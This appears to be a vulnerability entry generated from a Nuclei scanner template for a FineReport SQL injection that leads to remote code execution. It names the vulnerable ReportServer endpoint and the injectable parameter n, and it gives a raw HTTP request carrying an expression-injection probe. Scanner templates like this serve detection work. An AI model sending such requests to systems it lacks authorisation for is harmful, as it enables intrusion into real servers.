# Vulnerability: FineReport SQLi - Remote Code Execution
**Classification:** FINEREPORT
**Source:** Nuclei Template (`finereport-sqli-rce.yaml`)

## Description
Access URL:/webroot/decision/view/ReportServer?test=&n=, which can execute the SQL statement in GET parameter n. This vulnerability is caused by Fanruan's own sqlite-jdbc-x.x.x.x.jar driver.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /webroot/decision/view/ReportServer?{{string}}=&n=${sum(1024,123)} HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
```

